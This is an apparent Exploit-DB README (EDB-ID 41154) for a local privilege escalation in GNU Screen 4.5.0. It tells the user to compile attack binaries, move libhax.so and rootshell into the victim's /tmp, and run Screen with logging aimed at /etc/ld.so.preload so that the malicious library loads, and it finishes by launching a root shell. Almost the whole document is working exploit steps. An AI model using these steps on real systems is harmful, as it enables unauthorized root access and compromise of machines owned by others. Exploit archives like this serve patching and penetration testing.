# EDB-ID-41154

GNU Screen 4.5.0 - Local Privilege Escalation 

compile binaries on attacker machine
```
./compile.sh
```

transfer libhax.so and rootshell to victim to the /tmp folder

run commands:

```
cd /etc
umask 000 
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" 
screen -ls
/tmp/rootshell
```

